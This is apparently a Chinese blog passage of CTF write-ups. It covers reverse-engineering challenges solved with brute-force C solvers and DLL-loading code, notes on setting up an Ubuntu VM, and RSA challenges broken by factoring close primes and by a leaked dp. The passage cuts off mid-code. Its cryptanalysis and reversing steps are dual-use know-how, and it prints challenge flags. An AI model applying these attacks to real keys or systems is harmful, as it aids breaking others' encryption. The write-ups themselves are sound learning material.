<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">//我输入是 222 123 321</span><br>a = mul<span class="hljs-comment">(3,input1)</span><br>b = mul<span class="hljs-comment">(a,input1)</span>	<span class="hljs-comment">//147852</span><br>c = mul<span class="hljs-comment">(b,input2)</span>	<span class="hljs-comment">//18185796</span><br>pow<span class="hljs-comment">(input2,2)</span>		<span class="hljs-comment">//15129</span><br><br>a = mul<span class="hljs-comment">(3,input1)</span>		<span class="hljs-comment">//666</span><br>b<span class="hljs-number">1</span> = mul<span class="hljs-comment">(a,input2)</span>   <span class="hljs-comment">//input2已经平方 10075914										</span><br>a = add<span class="hljs-comment">(a,b1)</span>	<span class="hljs-comment">//10076580</span><br>a = add<span class="hljs-comment">(input1,input2)</span><br>b<span class="hljs-number">2</span> = pow<span class="hljs-comment">(a,3)</span>		<span class="hljs-comment">//41063625</span><br>b<span class="hljs-number">3</span> = del<span class="hljs-comment">(b2,b1)</span>			<span class="hljs-comment">//30987711</span><br>temp<span class="hljs-number">0</span> = del<span class="hljs-comment">(b3,c)</span>				<span class="hljs-comment">//12801915</span><br><br><br>a = mul<span class="hljs-comment">(48,input3)</span>		<span class="hljs-comment">//15408</span><br>b = mul<span class="hljs-comment">(12,input3)</span>		<span class="hljs-comment">//3852</span><br>c = mul<span class="hljs-comment">(b,input3)</span>		<span class="hljs-comment">//1236492</span><br>d = add<span class="hljs-comment">(4,input3)</span>		<span class="hljs-comment">//325</span><br>x = pow<span class="hljs-comment">(d,3)</span>		<span class="hljs-comment">//34328125</span><br>temp<span class="hljs-number">1</span> = del<span class="hljs-comment">(x,c)</span>			<span class="hljs-comment">//33091633</span><br>temp<span class="hljs-number">2</span> = del<span class="hljs-comment">(temp1,a)</span>					<span class="hljs-comment">//33076225</span><br>temp<span class="hljs-number">3</span> = del<span class="hljs-comment">(temp2,22)</span>	<span class="hljs-comment">//33076203</span><br><span class="hljs-keyword">if</span>（temp<span class="hljs-number">3</span>==temp<span class="hljs-number">0</span>）<br>    cat flag<br></code></pre></td></tr></table></figure>
<p>最终化简是x*<em>3+y</em>3 = z**3+42<br><a target="_blank" rel="noopener" href="https://www.sciencealert.com/the-sum-of-three-cubes-problem-has-been-solved-for-42">https://www.sciencealert.com/the-sum-of-three-cubes-problem-has-been-solved-for-42</a><br>google即可发现答案</p>
<h2 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h2><p>主要函数是<br>UnDecorateSymbolName(v5, outputString, 0x100u, 0);<br>反修饰<br>下面的验证直接爆破</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">#include &lt;stdint<span class="hljs-number">.</span>h&gt;<br>#include &lt;stdio<span class="hljs-number">.</span>h&gt;<br>#include &lt;string<span class="hljs-number">.</span>h&gt;<br>#include &lt;time<span class="hljs-number">.</span>h&gt;<br><br><br><span class="hljs-keyword">int</span> main()<br>&#123;<br>    unsigned char a[] = &#123;<span class="hljs-number">0x31</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x30</span>,<br>  <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x2A</span>,<br>  <span class="hljs-number">0x28</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x79</span>,<br>  <span class="hljs-number">0x75</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x52</span>,<br>  <span class="hljs-number">0x54</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x73</span>,<br>  <span class="hljs-number">0x64</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x41</span>,<br>  <span class="hljs-number">0x53</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x22</span>,<br>  <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3F</span>,<br>  <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2F</span>,<br>  <span class="hljs-number">0x00</span>&#125;<span class="hljs-comment">;</span><br>  unsigned char b[] = <span class="hljs-string">&quot;55565653255552225565565555243466334653663544426565555525555222&quot;</span><span class="hljs-comment">;</span><br>  unsigned char c[] = <span class="hljs-string">&quot;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&quot;</span><span class="hljs-comment">;</span><br>  <span class="hljs-keyword">int</span> i,temp<span class="hljs-comment">;</span><br>  for(i=<span class="hljs-number">0</span><span class="hljs-comment">;i&lt;64;i++)</span><br>  &#123;<br>    for(temp=<span class="hljs-number">32</span><span class="hljs-comment">;temp&lt;=125;temp++)</span><br>  &#123;<br>      if(a[temp<span class="hljs-subst">%23</span>]==c[i] &amp;&amp; a[temp/<span class="hljs-number">23</span>] == b[i])<br>      &#123;<br>          printf(<span class="hljs-string">&quot;%c&quot;</span>,temp)<span class="hljs-comment">;</span><br>          break<span class="hljs-comment">;</span><br>      &#125;<br>  &#125;<br>  &#125;<br>    return <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)<br>发现反修饰后应该如上<br>下面就是修饰了。。。<br>只能百度一波来自学<br>发现为?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z<br>置换一下</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-keyword">A</span> = [<span class="hljs-number">11,12,13,14</span>,<span class="hljs-number">15,16,17,18</span>,<span class="hljs-number">19,20,21,22</span>,<span class="hljs-number">23,24,25,26</span>,<span class="hljs-number">27,28,29,30</span>,<span class="hljs-number">31,32,33,34</span>,<span class="hljs-number">35,36,37,38</span>,<span class="hljs-number">39</span>,<span class="hljs-number">40</span>,<span class="hljs-number">41</span>]<br>B = [<span class="hljs-number">26,27,18,28</span>,<span class="hljs-number">29,19,14,30</span>,<span class="hljs-number">31,20,32,33</span>,<span class="hljs-number">21,15,12,34</span>,<span class="hljs-number">35,22,36,37</span>,<span class="hljs-number">23,16,38,39</span>,<span class="hljs-number">24,40,41,25</span>,<span class="hljs-number">17</span>,<span class="hljs-number">13</span>,<span class="hljs-number">11</span>]<br>c = &#x27;?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z&#x27;<br>a = &#x27;&#x27;<br>for i in range(len(<span class="hljs-keyword">A</span>)):<br>    for j in range(len(<span class="hljs-keyword">A</span>)):<br>        if B[j] == <span class="hljs-keyword">A</span>[i]:<br>            a += c[j]<br>print a<br>#Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP<br></code></pre></td></tr></table></figure>
<p>输入为<br>Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP</p>
<h2 id="re5"><a href="#re5" class="headerlink" title="re5"></a>re5</h2><p>unity逆向<br>又是游戏，当我看到这个的时候已经猜到了。。。<br>打开csharp的dll一顿乱翻然后要爆破什么sha1爆破sha256<br>结果。。。翻了一波dll感觉很正常是在实现程序流程<br>最后随便翻翻发现Interface.dll里面有点神奇的东西<br>可惜是c++写的看起来烦死。。。<br>不知道怎么调试，后来acd说可以用win自带的什么rundll32<br>可是佛说 不行<br>后来问了骑驴才知道可以写程序直接加载dll库调试…<br>后来看了大佬的博客发现更好的代码<br>上一波大佬的代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;libloaderapi.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* funcName = <span class="hljs-string">&quot;GameObject&quot;</span>;<br>	HMODULE hDLL = LoadLibrary(<span class="hljs-string">L&quot;Interface.dll&quot;</span>);<br>	<span class="hljs-keyword">if</span> (hDLL != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;load succ\n&quot;</span>);<br>		<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span><span class="hljs-params">(*funcptr)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br>		funcptr func = (funcptr)GetProcAddress(hDLL, funcName);<br>		<span class="hljs-keyword">if</span> (func != <span class="hljs-literal">NULL</span>)<br>		&#123;<br>			<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> res = func(atoi(argv[<span class="hljs-number">1</span>]));<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, res);<br><br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			for (int i = 0; i &lt; 100; i++) &#123;</span><br><span class="hljs-comment">				signed int res = func(i);</span><br><span class="hljs-comment">				printf(&quot;%d: %d\n&quot;, i, res);</span><br><span class="hljs-comment">			&#125;</span><br><span class="hljs-comment">			*/</span><br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;have func\n&quot;</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span><br>		&#123;<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no func\n&quot;</span>);<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;load fail\n&quot;</span>);<br>	&#125;<br><br><br>	getchar();<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>运行爆破即可</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;windows.h&gt;</span> // 必须包含 windows.h</span><br>typedef <span class="hljs-built_in">int</span> (*<span class="hljs-function"><span class="hljs-keyword">FUNC</span>)<span class="hljs-params">(unsigned int)</span>; // 指向函数的指针</span><br><span class="hljs-built_in">int</span> main()&#123;<br>HINSTANCE dllDemo = LoadLibrary(<span class="hljs-string">&quot;Interface.dll&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-function"><span class="hljs-keyword">FUNC</span> <span class="hljs-title">GameObject</span>;</span><br><span class="hljs-keyword">if</span>(dllDemo)&#123;<br>GameObject = (FUNADDR)GetProcAddress(dllDemo, <span class="hljs-string">&quot;GameObject&quot;</span>)<span class="hljs-comment">;</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>printf(<span class="hljs-string">&quot;Fail to load DLL!\n&quot;</span>)<span class="hljs-comment">;</span><br>system(<span class="hljs-string">&quot;pause&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br>&#125;<br>GameObject(<span class="hljs-number">0x65</span>)<span class="hljs-comment">;</span><br>system(<span class="hljs-string">&quot;pause&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>上面的是骑驴的<br>适合普遍dll<br>可以进去调试<br>//貌似在逆核的dll注入那有类似代码<br>//当时调过，但是没怎么在意。。。现在学到了</p>
<h1 id="虚拟机环境崩溃小记"><a href="#虚拟机环境崩溃小记" class="headerlink" title="虚拟机环境崩溃小记"></a>虚拟机环境崩溃小记</h1><p>以后我绝壁保存快照。。。<br>安装好虚拟机和vmware tools后<br>首先更新源<br>具体看下面链接<br><a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a><br>然后开始美化<br>下载unity-tweak-tool，可能会提示找不到。。。这就需要添加源了<br>添加源<br>sudo add-apt-repository ppa:noobslab/themes<br>sudo add-apt-repository ppa:noobslab/apps<br>sudo add-apt-repository ppa:docky-core/ppa<br>sudo apt-get update<br>sudo apt-get install unity-tweak-tool<br>然后安装dash-to-dock<br><a target="_blank" rel="noopener" href="https://extensions.gnome.org/">https://extensions.gnome.org/</a><br>完事。。。各种比例啊美化整一下<br>差不多就完事了。。。工具什么略</p>
<h1 id="密码学学习"><a href="#密码学学习" class="headerlink" title="密码学学习"></a>密码学学习</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>题目已知</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">n</span>=<span class="hljs-number">0</span>xe<span class="hljs-number">708251</span>f<span class="hljs-number">8</span>e<span class="hljs-number">8</span>b<span class="hljs-number">616121419</span>de<span class="hljs-number">1369</span>f<span class="hljs-number">44</span>b<span class="hljs-number">4</span>a<span class="hljs-number">92</span>f<span class="hljs-number">9641</span>b<span class="hljs-number">8270</span>ae<span class="hljs-number">6</span>c<span class="hljs-number">50</span>cef<span class="hljs-number">2</span>bb<span class="hljs-number">6548</span>de<span class="hljs-number">7633176399640</span>a<span class="hljs-number">553</span>cc<span class="hljs-number">764</span>ab<span class="hljs-number">02</span>decfd<span class="hljs-number">4</span>cbe<span class="hljs-number">45</span><br><br><span class="hljs-attribute">c</span>=<span class="hljs-number">0</span>x<span class="hljs-number">58</span>bd<span class="hljs-number">0290</span>b<span class="hljs-number">41</span>e<span class="hljs-number">567</span>e<span class="hljs-number">9839</span>a<span class="hljs-number">9</span>cc<span class="hljs-number">70295107</span>bb<span class="hljs-number">44</span>a<span class="hljs-number">9</span>e<span class="hljs-number">6</span>a<span class="hljs-number">9</span>b<span class="hljs-number">36</span>ee<span class="hljs-number">2</span>d<span class="hljs-number">36</span>e<span class="hljs-number">19</span>b<span class="hljs-number">01</span>bf<span class="hljs-number">55083823</span>b<span class="hljs-number">8983</span>e<span class="hljs-number">02</span>a<span class="hljs-number">8</span>ea<span class="hljs-number">5</span>b<span class="hljs-number">94</span>facb<span class="hljs-number">221797</span>babf<span class="hljs-number">72</span>b<br><br><span class="hljs-attribute">e</span>=<span class="hljs-number">0</span>x<span class="hljs-number">10001</span><br></code></pre></td></tr></table></figure>
<p>用yafu分解n得到下<br>P1 = 1235542029039790988583258906107<br>P2 = 1235542029039790988583258906103<br>P3 = 1235542029039790988583258906163<br>P4 = 1235542029039790988583258906019</p>
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">import</span> gmpy2</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">n=<span class="hljs-number">0xe708251f8e8b616121419de1369f44b4a92f9641b8270ae6c50cef2bb6548de7633176399640a553cc764ab02decfd4cbe45</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">c=<span class="hljs-number">0x58bd0290b41e567e9839a9cc70295107bb44a9e6a9b36ee2d36e19b01bf55083823b8983e02a8ea5b94facb221797babf72b</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">e=<span class="hljs-number">0x10001</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">P1 = <span class="hljs-number">1235542029039790988583258906107</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">P2 = <span class="hljs-number">1235542029039790988583258906103</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">P3 = <span class="hljs-number">1235542029039790988583258906163</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">p4 = <span class="hljs-number">1235542029039790988583258906019</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">phi = (P1-<span class="hljs-number">1</span>)*(P4-<span class="hljs-number">1</span>)*(P3-<span class="hljs-number">1</span>)*(P2-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">phi = (P1-<span class="hljs-number">1</span>)*(p4-<span class="hljs-number">1</span>)*(P3-<span class="hljs-number">1</span>)*(P2-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">d = gmpy2.invert(e,phi)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">d</span><br>mpz(510086803712167852900754319229584716089112564397702829464421119022899788570515360220333901730802856685065338443789034993L)<br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m = <span class="hljs-built_in">pow</span>(c,d,n)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br>flag&#123;2a0efd7734a07c6c430cfd04dfccdd94&#125;<br><span class="hljs-meta">&gt;&gt;&gt;</span><br></code></pre></td></tr></table></figure>
<h2 id="easyesa"><a href="#easyesa" class="headerlink" title="easyesa"></a>easyesa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, inverse<br>flag = <span class="hljs-string">&#x27;flag&#123;a-z0-9&#125;&#x27;</span><br>nbits = <span class="hljs-number">2048</span><br>p = getPrime(nbits / <span class="hljs-number">2</span>)<br>q = getPrime(nbits / <span class="hljs-number">2</span>)<br><span class="hljs-keyword">assert</span> p != q<br>N = p * q<br>e = <span class="hljs-number">0x10001</span><br>phiN = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = inverse(e, phiN)<br>phint = d % (p - <span class="hljs-number">1</span>)<br>qhint = q % (p - <span class="hljs-number">1</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str2int</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(s.encode(<span class="hljs-string">&#x27;hex&#x27;</span>), <span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;pubkey.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-built_in">str</span>(e) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-built_in">str</span>(N) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-built_in">str</span>(phint) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-built_in">str</span>(qhint) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>plain = str2int(flag)<br><br>c = <span class="hljs-built_in">pow</span>(plain, e, N)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cipher.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-built_in">hex</span>(c))<br><br></code></pre></td></tr></table></figure>
<p>已知<br>e = 65537<br>n = 16969752165509132627630266968748854330340701692125427619559836488350298234735571480353078614975580378467355952333755313935516513773552163392952656321490268452556604858966899956242107008410558657924344295651939297328007932245741660910510032969527598266270511004857674534802203387399678231880894252328431133224653544948661283777645985028207609526654816645155558915197745062569124587412378716049814040670665079480055644873470756602993387261939566958806296599782943460141582045150971031211218617091283284118573714029266331227327398724265170352646794068702789645980810005549376399535110820052472419846801809110186557162127<br>dp = 1781625775291028870269685257521108090329543012728705467782546913951537642623621769246441122189948671374990946405164459867410646825591310622618379116284293794090970292165263334749393009999335413089903796624326168039618287078192646490488534062803960418790874890435529393047389228718835244370645215187358081805<br>qp = 10450978538445496868237560522155647855468044038637044818500580506745232482415364474390893285539835615564332910332708101539048528242011762736342572650763270501265440674647489375438852377280494520168349154604800218665628586180057648386859933274414030182106920793492451577530884172876623074281199949317487086975<br>c = 0x71512577b69cea3b42466100f3d5d50de95ab16971ad25d9204ff8df52bd52dafcd054d997ec3fe37d2590c2b0eebec172ec02fa62c35c62e39c89f1f5c51c869a5cc8083c1e76da430f26542a444a0295f52414118e47b72e9f370498cca3a69a1148c9433b97bc816dee45d12fec94f6aaf754273cfb19b0055d5b00630ba1b8a6b2b0a2abfd630d68b7a95e2ec45192e2ff229f893ea6ec7620677d4d8bd79f3dd420e0b2c0a26de37c700a3953c2094c4797bbbb47f72fdc1d8acac69b755d0caeb090885baf7b8e2ea4b36a41bea67477101b9706dedc338e076921c98c8ce2468ab48b14829241dbdfb8572a84714c798a29742b4176061efdf0320c86</p>
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">65538</span>):</span><br><span class="hljs-meta">...</span> <span class="python">    <span class="hljs-keyword">if</span>  (dp*e-<span class="hljs-number">1</span>)%i == <span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">        <span class="hljs-keyword">if</span> n%(((dp*e-<span class="hljs-number">1</span>)//i)+<span class="hljs-number">1</span>)==<span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">            q = n//(((dp*e-<span class="hljs-number">1</span>)//i)+<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">...</span> <span class="python">            p = (((dp*e-<span class="hljs-number">1</span>)//i)+<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">...</span> <span class="python">            phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">...</span> <span class="python">            d = gmpy2.invert(e,phi)</span><br><span class="hljs-meta">...</span> <span class="python">            m=<span 